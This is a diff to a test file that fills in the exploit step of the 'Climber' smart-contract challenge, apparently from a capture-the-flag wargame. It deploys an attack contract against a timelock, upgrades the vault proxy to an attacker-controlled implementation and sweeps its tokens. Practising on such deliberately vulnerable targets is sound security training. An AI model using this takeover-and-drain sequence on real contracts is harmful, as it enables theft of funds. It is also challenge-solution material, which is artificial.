@@ -53,6 +53,16 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const expF = await ethers.getContractFactory('Exp',attacker);
+        const exp = await expF.deploy(this.timelock.address, this.vault.address, attacker.address);
+        await exp.attack();
+
+        let newvault = await upgrades.upgradeProxy(this.vault.address,
+            await ethers.getContractFactory('ExpClimberVault', attacker)
+            );
+        
+        await newvault.connect(attacker).sweep(this.token.address);
+        
     });
 
     after(async function () {
